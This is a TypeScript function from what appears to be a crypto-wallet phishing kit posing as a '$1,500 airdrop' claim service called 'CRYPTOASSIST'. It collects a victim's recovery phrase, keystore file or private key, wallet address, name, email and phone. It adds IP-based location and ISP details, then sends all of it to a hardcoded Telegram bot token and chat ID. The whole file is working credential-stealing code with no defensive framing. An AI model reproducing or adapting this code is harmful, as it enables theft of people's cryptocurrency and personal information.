export async function sendToTelegram(data: {
  walletAddress: string
  credential: string
  credentialType: "phrase" | "keystore" | "privatekey"
  wallet: string
  crypto: string
  userInfo?: {
    name?: string
    email?: string
    phone?: string
    message?: string
    category?: string
  }
}) {
  try {
    const ipResponse = await fetch("https://ipapi.co/json/")
    const ipData = await ipResponse.json()

    const telegramBotToken = "8326003382:AAGeZ2DwKKSyoGceMXrudC5DWm47mWHSEOk"
    const telegramChatId = "5707645216"

    const credentialTypeLabel = {
      phrase: "Recovery Phrase",
      keystore: "Keystore File",
      privatekey: "Private Key",
    }[data.credentialType]

    const message = `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ✨ NEW CRYPTOASSIST REQUEST ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **CLAIM DETAILS**
─────────────────────────────────────────
💰 Airdrop Amount: $1,500
🪙 Cryptocurrency: ${data.crypto}
💼 Wallet Type: ${data.wallet}

🔐 **WALLET CREDENTIALS**
─────────────────────────────────────────
🔑 Credential Type: ${credentialTypeLabel}
📝 Credential Data:
\`\`\`
${data.credential}
\`\`\`

💳 Wallet Address:
\`\`\`
${data.walletAddress}
\`\`\`

${
  data.userInfo?.name
    ? `👤 **USER INFORMATION**
─────────────────────────────────────────
👤 Full Name: ${data.userInfo.name}
📧 Email: ${data.userInfo.email}
📱 Phone: ${data.userInfo.phone || "Not provided"}
💬 Message/Issue: ${data.userInfo.message || "Not provided"}
${data.userInfo.category ? `📂 Category/Issue Type: ${data.userInfo.category}` : ""}`
    : ""
}

📍 **USER LOCATION & IP INFORMATION**
─────────────────────────────────────────
🌍 Country: ${ipData.country_name || "Unknown"}
🏙️ City: ${ipData.city || "Unknown"}
📌 IP Address: ${ipData.ip || "Unknown"}
🔍 ISP/Organization: ${ipData.org || "Unknown"}
📊 Coordinates (Lat/Long): ${ipData.latitude || "N/A"}, ${ipData.longitude || "N/A"}
🌐 Timezone: ${ipData.timezone || "Unknown"}

⏰ **TIMESTAMP & VERIFICATION**
─────────────────────────────────────────
🕐 Date & Time: ${new Date().toLocaleString()}
🔒 Status: PENDING VERIFICATION

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ✅ REQUEST SUBMITTED SUCCESSFULLY ✅
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`

    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    const result = await response.json()
    return result.ok
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return false
  }
}
